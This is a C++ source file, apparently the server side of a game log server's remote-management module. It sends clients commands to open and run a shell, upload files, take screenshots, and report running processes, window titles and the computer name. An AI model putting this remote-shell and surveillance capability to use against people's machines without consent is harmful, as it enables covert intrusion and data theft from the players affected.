#include <asio2/asio2.hpp>
#include <msgpack.hpp>
#include "protocol.h"
#include "rmc_protocol.h"
#include "log_server.h"
#include "rmc_mgr.h"
#include "rmc_file_mgr.h"
#include "rmc_screen_shot_mgr.h"
#include "rmc_cmd_mgr.h"
#include "player_mgr.h"
#include "utils.h"

RmcMgr& RmcMgr::instance()
{
	static RmcMgr instance_;
	return instance_;
}

void RmcMgr::on_recv_rmc(unsigned long conn_id, const ProtocolRmc& proto)
{
	switch (proto.type)
	{
	case RMC_PKG_TYPE_ECHO:
	{
		msgpack::unpacked msg_;
		msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
		recv_echo(conn_id, msg_.get().as<std::string>());
		break;
	}
	case RMC_PKG_TYPE_UPLOAD_FILE:
	{
		msgpack::unpacked msg_;
		msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
		auto [status, path, total_size, pos, piece] = msg_.get().as<RmcC2SUploadFile>();
		if (status != UPLOAD_FILE_STATUS_SUCCESS)
		{
			std::cerr << "recv file error:" << status << std::endl;
			break;
		}
		if (!RmcFileMgr::instance().is_task_exist(conn_id, path))
		{
			RmcFileMgr::instance().create_task(conn_id, path);
			RmcFileMgr::instance().get_task(conn_id, path).lock()->create_file(total_size);
		}
		std::cout << pos << "|" << piece.size() << std::endl;
		if ((pos + piece.size()) != total_size)
		{
			RmcFileMgr::instance().get_task(conn_id, path).lock()->write(pos, piece);
		}
		else
		{
			RmcFileMgr::instance().get_task(conn_id, path).lock()->write(pos, piece);
			RmcFileMgr::instance().remove_task(conn_id, path);
		}
		break;
	}
	case RMC_PKG_TYPE_SCREENSHOT:
	{
		msgpack::unpacked msg_;
		msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
		auto[status, guid, total_size, pos, piece] = msg_.get().as<RmcC2SScreenShot>();
		if (status != SCREEN_SHOT_STATUS_SUCCESS)
		{
			std::cerr << "recv file error:" << status << std::endl;
			break;
		}
		if (!RmcScreenShotMgr::instance().is_task_exist(conn_id, guid))
		{
			RmcScreenShotMgr::instance().create_task(conn_id, guid);
			RmcScreenShotMgr::instance().get_task(conn_id, guid).lock()->create_file(total_size);
		}
		std::cout << pos << "|" << piece.size() << std::endl;
		if ((pos + piece.size()) != total_size)
		{
			RmcScreenShotMgr::instance().get_task(conn_id, guid).lock()->write(pos, piece);
		}
		else
		{
			RmcScreenShotMgr::instance().get_task(conn_id, guid).lock()->write(pos, piece);
			RmcScreenShotMgr::instance().remove_task(conn_id, guid);
		}
		break;
	}
	case RMC_PKG_TYPE_CMD:
	{
		msgpack::unpacked msg_;
		msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
		auto[status, work_path, cmd, resp] = msg_.get().as<RmcC2SCommandLine>();
		RmcCmdMgr::instance().on_recv_rmc_cmd(status, work_path, cmd, resp);
		break;
	}
	case RMC_PKG_TYPE_QUERY_INFORMATION:
	{
		if (!PlayerMgr::instance().exist(conn_id))
			break;
		msgpack::unpacked msg_;
		msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
		auto [type, r1, r2] = msg_.get().as<RmcC2SQueryInformation>();
		json& data = *PlayerMgr::instance().get_player_data(conn_id).lock();
		switch (type)
		{
		case QUERY_INFORMATION_PROCESS:
		{
			auto processes = data.at("processes").get<std::set<std::string>>();
			for (auto& process : r2)
			{
				processes.emplace(to_utf8(process));
			}
			data["processes"] = processes;
			break;
		}
		case QUERY_INFORMATION_WINDOWS:
		{
			auto windows = data.at("windows").get<std::set<std::string>>();
			for (auto& window : r2)
			{
				windows.emplace(to_utf8(window));
			}
			data["windows"] = windows;
			break;
		}
		case QUERY_INFORMATION_COMPUTER_NAME:
		{
			data["computer_name"] = to_utf8(r1);
			break;
		}
		default:
			break;
		}

		break;
	}
	default:
		break;
	}
	
}

void RmcMgr::query_information(unsigned long conn_id, unsigned char type)
{
	RmcS2CQueryInformation query{ type };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, query);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_QUERY_INFORMATION;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}

void RmcMgr::recv_echo(unsigned long conn_id, const std::string& content)
{
	std::cout << content << std::endl;
}

void RmcMgr::send_echo(unsigned long conn_id, const std::string& content)
{
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, content);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_ECHO;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}
//client download file from server
void RmcMgr::download_file(unsigned long conn_id, const std::string& path, const std::string& land_path)
{
	std::ifstream file(path, std::ios::in | std::ios::binary);
	if (!file.is_open())
	{
		std::cerr << "file can't open:" << path << std::endl;
		return;
	}
	file.seekg(0, file.end);
	std::size_t file_size = file.tellg();
	file.seekg(0);
	const int piece_size = 0x1000;
	const int num_piece = file_size / piece_size;
	const std::size_t rest_size = file_size % piece_size;
	for (int i = 0; i < num_piece; i++)
	{
		std::vector<unsigned char> piece(piece_size);
		file.read((char*)piece.data(), piece.size());
		RmcS2CDownloadFile downloadfile{ DOWNLOAD_FILE_STATUS_SUCCESS, land_path, file_size, i*piece_size, piece };
		msgpack::sbuffer buffer;
		msgpack::pack(buffer, downloadfile);
		ProtocolRmc proto;
		proto.type = RMC_PKG_TYPE_DOWNLOAD_FILE;
		proto.data.resize(buffer.size());
		memcpy(proto.data.data(), buffer.release(), buffer.size());
		LogServer::instance().trans_send(conn_id, proto);
		std::cout << i * piece_size << "|" << piece.size() << std::endl;
	}
	if (rest_size)
	{
		std::vector<unsigned char> piece(rest_size);
		file.read((char*)piece.data(), piece.size());
		RmcS2CDownloadFile downloadfile{ DOWNLOAD_FILE_STATUS_SUCCESS, land_path, file_size, num_piece * piece_size, piece };
		msgpack::sbuffer buffer;
		msgpack::pack(buffer, downloadfile);
		ProtocolRmc proto;
		proto.type = RMC_PKG_TYPE_DOWNLOAD_FILE;
		proto.data.resize(buffer.size());
		memcpy(proto.data.data(), buffer.release(), buffer.size());
		LogServer::instance().trans_send(conn_id, proto);
		std::cout << num_piece * piece_size << "|" << piece.size() << std::endl;
	}
}

//client upload file to server
void RmcMgr::upload_file(unsigned long conn_id, const std::string& path)
{
	RmcS2CUploadFile uploadfile { path };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, uploadfile);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_UPLOAD_FILE;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}

void RmcMgr::upload_screenshot(unsigned long conn_id, const std::string& guid)
{
	RmcS2CScreenShot screenshot{ guid };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, screenshot);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_SCREENSHOT;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}

void RmcMgr::create_cmd(unsigned long conn_id, const std::string& work_dir)
{
	RmcS2CCommandLine msg{ COMMAND_LINE_OPERATION_CREATE, work_dir, "", ""};
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, msg);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_CMD;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}

void RmcMgr::execute_cmd(unsigned long conn_id, const std::string& cmd)
{
	RmcS2CCommandLine msg{ COMMAND_LINE_OPERATION_EXECUTE, "", cmd, "" };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, msg);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_CMD;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}

void RmcMgr::close_cmd(unsigned long conn_id)
{
	RmcS2CCommandLine msg{ COMMAND_LINE_OPERATION_CLOSE, "", "", "" };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, msg);
	ProtocolRmc proto;
	proto.type = RMC_PKG_TYPE_CMD;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	LogServer::instance().trans_send(conn_id, proto);
}
